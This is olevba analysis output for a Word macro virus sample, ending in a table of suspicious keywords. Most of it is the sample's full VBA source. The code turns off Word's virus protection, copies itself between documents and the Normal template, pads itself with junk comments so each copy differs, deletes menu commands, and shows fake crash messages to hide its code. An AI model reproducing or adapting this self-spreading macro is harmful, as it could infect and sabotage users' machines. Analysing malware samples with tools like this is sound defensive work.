olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.ed
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.ed - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:13 AM
On Error Resume Next
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:13 AM
CommandBars("Tools").Controls("Options...").Delete
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:13 AM
CommandBars("Tools").Controls("Templates and Add-Ins...").Delete
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:13 AM
Options.VirusProtection = False
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:13 AM
Options.SaveNormalPrompt = False
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:13 AM
CommandBars("Format").Controls("Style...").Delete
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:13 AM
Options.ConfirmConversions = False
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:13 AM
CommandBars("Tools").Controls("Customize...").Delete
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:13 AM
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines > 90 And ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines > 90 Then GoTo Epp
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:13 AM
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines < 90 Then
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:13 AM
    Set Eho = NormalTemplate.VBProject.VBComponents.Item(1)
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:13 AM
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\system.sys"
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:13 AM
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ("c:\system.sys")
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:13 AM
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.replaceline 5, "Sub AutoClose"
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:13 AM
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.replaceline 99, "Sub ToolsMacro"
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:13 AM
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.replaceline 105, "Sub ViewVBCode"
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:13 AM
End If
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:13 AM
If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines < 90 Then
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:13 AM
    Set Eho = ActiveDocument.VBProject.VBComponents.Item(1)
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:13 AM
    ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ("c:\system.sys")
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:13 AM
    ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.replaceline 99, "Private Sub TM"
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:13 AM
    ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.replaceline 105, "Private Sub VVBC"
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:13 AM
End If
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:13 AM
With Eho.CodeModule
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:13 AM
    For x = 1 To 4
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:13 AM
    .deletelines 1
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:13 AM
    Next x
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:13 AM
End With
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:13 AM
With Eho.CodeModule
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:13 AM
    For x = 2 To 104 Step 2
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:13 AM
    .replaceline x, "'" & Now & Application.ActivePrinter & Application.UserName & "sdjw3456ot76 weor9w58349583" & Now
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:13 AM
    Next x
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:13 AM
    .replaceline 106, "'MV Version 1e"
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:13 AM
End With
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:13 AM
If Day(Now) = 15 Then
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:13 AM
    CommandBars("File").Controls("Page Setup...").Delete
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:13 AM
    CommandBars("File").Controls("Print Preview").Delete
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:13 AM
    CommandBars("File").Controls("Print...").Delete
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:13 AM
    CommandBars("File").Controls("Exit").Delete
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:13 AM
    CommandBars("File").Controls("New...").Delete
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:13 AM
    CommandBars("File").Controls("Open...").Delete
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:13 AM
    CommandBars("File").Controls("Close").Delete
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:13 AM
End If
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:13 AM
Epp:
'4/5/00 11:56:13 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:14 AM
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines > 80 And ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines > 80 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
'4/5/00 11:56:14 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:14 AM
End Sub
'4/5/00 11:56:14 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:14 AM
Private Sub TM()
'4/5/00 11:56:14 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:14 AM
MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
'4/5/00 11:56:14 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:14 AM
End Sub
'4/5/00 11:56:14 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:14 AM
Private Sub VVBC()
'4/5/00 11:56:14 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:14 AM
MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
'4/5/00 11:56:14 AMKyocera FS-1600 on \\VETDEV\KYOCERAHILsdjw3456ot76 weor9w583495834/5/00 11:56:14 AM
End Sub
'MV Version 1e


Private Sub Document_New()
    StartWizard
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

